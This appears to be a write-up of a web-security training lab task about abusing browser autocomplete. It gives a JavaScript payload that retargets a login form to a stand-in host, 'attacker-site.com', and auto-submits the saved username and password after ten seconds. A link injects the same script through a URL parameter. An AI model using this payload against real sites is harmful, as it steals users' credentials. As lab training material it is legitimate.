## Task 12 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/12)</small>

Objectives:

1. Enter a Username/Password and allow the browser to remember it
2. Reload the page so the auto-complete now adds the Username/Password automatically
3. Write JS attack code which waits for 10 seconds, then submits the form automatically to your Attack server

This is pretty interesting task. So basically in this we have to exploit the autocomplete feature provided by the modern browsers.

Time waits in javascript are provided by [setInterval](https://www.w3schools.com/jsref/met_win_setinterval.asp) and [setTimeout](https://www.w3schools.com/jsref/met_win_settimeout.asp)

In this case, we need setTimeout feature.

The input tags are not set to autocomplete. So we will do it at first

![](https://i.imgur.com/sC7bnlU.png)

```js
let form = document.forms[0];
form.autocomplete = "on";
form.action = "https://attacker-site.com";
form.method = "POST";
setTimeout(() => {
  form.submit();
}, 10000);
```

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/12?url=%3Cscript%3Elet%20form%20%3D%20document.forms%5B0%5D%3B%0Aform.autocomplete%20%3D%20%22on%22%3B%0Aform.action%20%3D%20%22https%3A%2F%2Fattacker-site.com%22%3B%0Aform.method%20%3D%20%22https%3A%2F%2Fattacker-site.com%22%3B%0AsetTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20form.submit%28%29%3B%0A%7D%2C%2010000%29%3B%0A%3C%2Fscript%3E)

**More Resources**

1. [setInterval vs setTimeout](https://stackoverflow.com/a/729943/10362396)
2. [Setting `autocomplete` property using javascript](https://www.w3schools.com/jsref/prop_form_autocomplete.asp)
